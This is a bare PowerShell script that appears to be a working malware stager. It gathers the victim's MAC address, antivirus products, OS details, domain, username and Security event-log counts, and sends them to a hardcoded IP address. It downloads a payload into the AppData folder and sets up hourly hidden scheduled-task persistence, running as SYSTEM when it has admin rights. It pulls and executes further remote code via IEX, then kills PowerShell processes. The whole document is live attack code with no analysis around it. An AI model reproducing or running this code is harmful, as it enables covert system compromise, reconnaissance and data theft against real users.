[string]$av = ""

[string]$avs = ""

[string]$log1 = ""

[string]$log2 = ""

[string]$mac = (getmac /FO CSV|Select-Object -Skip 1 -first 1| ConvertFrom-Csv -Header MAC|select-object -expand MAC)

$avs = (Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct).displayName

if($avs.GetType().name.IndexOf('Object') -gt -1){

	for($v = 0; $v -lt $avs.Count; $v++){

		$av += $avs[$v] + "|"

	}

}else{

$av = $avs

}

try{

	if((Get-Service zhudongfangyu | Sort -Property Status).Status -eq "Running"){

		$av += 'ZDFY'

	}

}catch{}

#[System.Threading.Thread]::Sleep((Get-Random -Minimum 10000 -Maximum 100000))


$path = "$env:temp\\ppppp.log"

[string]$flag = test-path $path


try{

$log1 = (Get-EventLog -LogName 'Security' -After (get-date).AddDays(-7) -befor (get-date).AddDays(-3)).length

$log2 = (Get-EventLog -LogName 'Security' -After (get-date).AddDays(-2)).length

}catch{}


$key = "&mac="+$mac+"&av="+$av+"&ver="+(Get-WmiObject -Class Win32_OperatingSystem).version+"&bit="+(Get-WmiObject Win32_OperatingSystem).OSArchitecture + "&flag2=" + $flag + "&domain=" + (Get-WmiObject win32_computersystem).Domain + "&user=" + $env:USERNAME + "&log1=" + $log1 + "&log2=" + $log2


if($flag -eq 'False'){

	try{

		$file = "$env:appdata\\Microsoft\\cred.ps1"

		$size = (Get-ChildItem $file -recurse | Measure-Object -property length -sum).sum

		if($size -ne 2997721){

			$url = 'http://27.102.107.137/new.dat?pebb' + $key

			(New-Object System.Net.WebClient).DownloadFile($url,"$file")

			$size2 = (Get-ChildItem $file -recurse | Measure-Object -property length -sum).sum

			if($size2 -eq 2997721){

				$status = 'add_ok'

				if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")){

				&cmd.exe /c schtasks /create /ru system /sc MINUTE /mo 60 /st 07:00:00 /tn Credentials /tr "powershell -nop -w hidden -ep bypass -f %appdata%\Microsoft\cred.ps1" /F

				}else{

				&cmd.exe /c schtasks /create /sc MINUTE /mo 60 /st 07:00:00 /tn Credentials /tr "powershell -nop -w hidden -ep bypass -f %appdata%\Microsoft\cred.ps1" /F

				}

			}else{$status = 'error'}

		}else{

		$status = 'old1'

		}

		New-Item $path -type file

	}catch{}

}else{

$status = 'old2'

}


try{

	$download = 'http://27.102.107.137/status.json?pebb' + $key  + "&" + $status  + "&" + $MyInvocation.MyCommand.Definition

	IEX (New-Object Net.WebClient).DownloadString("$download")

}catch{}


try{

	&cmd.exe /c schtasks /delete /tn "\Microsoft\Credentials" /f

}catch{}


[System.Threading.Thread]::Sleep(3000)

Stop-Process -Force -processname powershell


